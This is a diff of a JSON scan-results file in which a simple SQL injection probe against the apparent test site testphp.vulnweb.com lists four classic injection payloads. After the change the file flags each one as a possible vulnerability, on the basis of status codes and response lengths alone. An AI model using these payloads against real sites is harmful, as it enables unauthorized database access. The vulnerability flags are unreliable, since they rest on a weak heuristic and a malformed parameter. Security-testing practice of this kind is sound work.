@@ -1,29 +1,33 @@
 {
-  "target_url": "http://testphp.vulnweb.com/listproducts.php?cat=",
+  "target_url": "http://testphp.vulnweb.com/listproducts.php?cat=id=1",
   "results": [
     {
       "payload": "'",
-      "full_url": "http://testphp.vulnweb.com/listproducts.php?cat='",
-      "error": "HTTPConnectionPool(host='testphp.vulnweb.com', port=80): Max retries exceeded with url: /listproducts.php?cat=' (Caused by ConnectTimeoutError(<HTTPConnection(host='testphp.vulnweb.com', port=80) at 0x119398f8c90>, 'Connection to testphp.vulnweb.com timed out. (connect timeout=10)'))",
-      "possible_vulnerability": false
+      "full_url": "http://testphp.vulnweb.com/listproducts.php?cat=id=1'",
+      "status_code": 200,
+      "response_length": 2140,
+      "possible_vulnerability": true
     },
     {
       "payload": "' OR '1'='1",
-      "full_url": "http://testphp.vulnweb.com/listproducts.php?cat=' OR '1'='1",
-      "error": "HTTPConnectionPool(host='testphp.vulnweb.com', port=80): Max retries exceeded with url: /listproducts.php?cat='%20OR%20'1'='1 (Caused by NewConnectionError(\"HTTPConnection(host='testphp.vulnweb.com', port=80): Failed to establish a new connection: [WinError 10053] An established connection was aborted by the software in your host machine\"))",
-      "possible_vulnerability": false
+      "full_url": "http://testphp.vulnweb.com/listproducts.php?cat=id=1' OR '1'='1",
+      "status_code": 200,
+      "response_length": 2150,
+      "possible_vulnerability": true
     },
     {
       "payload": "' OR 1=1 --",
-      "full_url": "http://testphp.vulnweb.com/listproducts.php?cat=' OR 1=1 --",
-      "error": "HTTPConnectionPool(host='testphp.vulnweb.com', port=80): Max retries exceeded with url: /listproducts.php?cat='%20OR%201=1%20-- (Caused by NameResolutionError(\"HTTPConnection(host='testphp.vulnweb.com', port=80): Failed to resolve 'testphp.vulnweb.com' ([Errno 11001] getaddrinfo failed)\"))",
-      "possible_vulnerability": false
+      "full_url": "http://testphp.vulnweb.com/listproducts.php?cat=id=1' OR 1=1 --",
+      "status_code": 200,
+      "response_length": 2150,
+      "possible_vulnerability": true
     },
     {
       "payload": "\" OR \"a\"=\"a",
-      "full_url": "http://testphp.vulnweb.com/listproducts.php?cat=\" OR \"a\"=\"a",
-      "error": "HTTPConnectionPool(host='testphp.vulnweb.com', port=80): Max retries exceeded with url: /listproducts.php?cat=%22%20OR%20%22a%22=%22a (Caused by NameResolutionError(\"HTTPConnection(host='testphp.vulnweb.com', port=80): Failed to resolve 'testphp.vulnweb.com' ([Errno 11001] getaddrinfo failed)\"))",
-      "possible_vulnerability": false
+      "full_url": "http://testphp.vulnweb.com/listproducts.php?cat=id=1\" OR \"a\"=\"a",
+      "status_code": 200,
+      "response_length": 2150,
+      "possible_vulnerability": true
     }
   ]
 }
